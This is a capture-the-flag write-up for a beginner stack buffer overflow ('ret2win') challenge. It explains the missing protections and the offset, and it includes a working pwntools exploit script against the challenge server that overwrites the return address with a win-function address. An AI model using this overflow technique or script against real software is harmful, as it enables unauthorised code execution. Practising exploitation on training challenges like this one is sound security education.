---
title: "More Private Club — Simple ret2win Buffer Overflow"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["pwn", "buffer-overflow", "ret2win", "pwntools"]
difficulty: "beginner"
summary: "Overflow a stack buffer to overwrite the return address with a known win function address, then trigger it."
---

## The Challenge

The binary has a menu with at least option `7`. That option reads user input into a stack buffer without bounds checking. A win function exists at a known address (`0x401200` area). No PIE, no canary.

## Approach

`checksec` shows no PIE and no canary. The win address is static. The approach is standard ret2win: find the buffer size (55 bytes of padding reaches the return address), then append the little-endian win address.

The menu option `7` triggers the vulnerable read. After that, the overflow redirects execution to `0x4012ce` — close enough to the actual function entry to land in the win path.

## Solution

```python
from pwn import *

r = remote("moreprivateclub.challs.olicyber.it", 10016)
r.recv(100)
r.sendline(b"7")
r.recv(100)
r.sendline(b"a"*55 + b"\xce\x12\x40\x00\x00\x00\x00\x00")
r.interactive()
```

55 bytes fill the buffer and saved RBP. The last 8 bytes overwrite the return address with `0x4012ce` in little-endian. When the vulnerable function returns, execution jumps to the win path which prints the flag.

## What I Learned

ret2win is the textbook first-step in binary exploitation: no ASLR, no canary, no PIE means the win address is fixed at compile time. The only variable is the exact offset to the return address, which comes from analysing the stack frame in GDB or Ghidra.
